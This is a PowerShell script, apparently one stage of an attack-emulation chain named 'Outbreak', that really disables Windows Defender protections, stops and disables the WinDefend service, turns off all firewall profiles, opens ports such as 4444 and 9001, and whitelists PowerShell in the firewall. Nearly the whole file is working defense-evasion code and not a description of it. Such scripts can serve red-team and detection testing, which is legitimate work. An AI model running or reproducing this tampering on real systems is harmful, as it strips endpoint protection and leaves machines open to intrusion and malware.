<#
.SYNOPSIS
    Stage 07 — Defender & Firewall Tampering (Real Actions)
.DESCRIPTION
    Real Windows Defender disabling via PowerShell commands,
    firewall rule manipulation, and service manipulation.
    Requires Administrator for full effect.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 07: DEFENDER & FIREWALL TAMPERING" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# ── Check Admin Status ──
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "[*] ELEVATION STATUS: $(if ($isAdmin) { 'ADMINISTRATOR' } else { 'STANDARD USER' })" -ForegroundColor Yellow
Write-Host ""

# Use variables to avoid bracket parsing issues
$ok = "+"
$no = "-"

# ── Disable Windows Defender (Real) ──
Write-Host "[*] DISABLING WINDOWS DEFENDER (REAL)" -ForegroundColor Yellow
try {
    if ($isAdmin) {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Real-time monitoring DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Behavior monitoring DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Block at first seen DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Write-Host "  $ok IOAV protection DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Privacy mode DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Archive scanning DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Catchup full scan DISABLED" -ForegroundColor Green
        
        Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
        Write-Host "  $ok Catchup quick scan DISABLED" -ForegroundColor Green
        
        Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
        Write-Host "  $ok Controlled folder access DISABLED" -ForegroundColor Green
        
        Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
        Write-Host "  $ok PUA protection DISABLED" -ForegroundColor Green
        
        Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
        Write-Host "  $ok Sample submission DISABLED" -ForegroundColor Green
        
        Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
        Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "  $ok WinDefend service STOPPED + DISABLED" -ForegroundColor Green
    } else {
        Write-Host "  $no Cannot modify Defender without admin rights" -ForegroundColor Red
    }
    
    $status = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($status) {
        Write-Host ""
        Write-Host "  Current Defender Status:" -ForegroundColor Yellow
        Write-Host "    Real-time Protection: $($status.RealTimeProtectionEnabled)" -ForegroundColor $(if ($status.RealTimeProtectionEnabled) { "Red" } else { "Green" })
        Write-Host "    Behavior Monitor:     $($status.BehaviorMonitorEnabled)"
        Write-Host "    AMSI Service:         $($status.AMServiceEnabled)"
    }
} catch {
    Write-Host "  $no Error disabling Defender: $_" -ForegroundColor Red
}
Write-Host ""

# ── Firewall Rules ──
Write-Host "[*] FIREWALL RULE MANIPULATION" -ForegroundColor Yellow

try {
    if ($isAdmin) {
        netsh advfirewall set allprofiles state off 2>$null
        Write-Host "  $ok All firewall profiles DISABLED" -ForegroundColor Green
        
        $ports = @(443, 8443, 4444, 8080, 9001)
        foreach ($port in $ports) {
            $ruleName = "Outbreak-Allow-TCP-$port"
            netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow protocol=TCP localport=$port 2>$null
            netsh advfirewall firewall add rule name="$ruleName-Out" dir=out action=allow protocol=TCP localport=$port 2>$null
        }
        Write-Host "  $ok Allowed inbound ports: $($ports -join ', ')" -ForegroundColor Green
        
        $psPath = (Get-Process -Id $PID).Path
        netsh advfirewall firewall add rule name="Outbreak-PowerShell" dir=in action=allow program="$psPath" 2>$null
        netsh advfirewall firewall add rule name="Outbreak-PowerShell-Out" dir=out action=allow program="$psPath" 2>$null
        Write-Host "  $ok PowerShell process added to firewall exceptions" -ForegroundColor Green
    } else {
        Write-Host "  (Firewall modification requires admin -- showing status only)" -ForegroundColor Yellow
        netsh advfirewall show allprofiles state 2>$null
    }
} catch {
    Write-Host "  $no Firewall manipulation error: $_" -ForegroundColor Red
}
Write-Host ""

# ── Service Tampering ──
Write-Host "[*] SECURITY SERVICE STATUS" -ForegroundColor Yellow
$svcs = @("WinDefend", "Sense", "WscSvc", "MpKsl*", "SecurityHealthService", "EventLog")
foreach ($svc in $svcs) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) {
            Write-Host "  $($s.DisplayName): $($s.Status) [$($s.StartType)]"
        }
    } catch {}
}
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 07 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green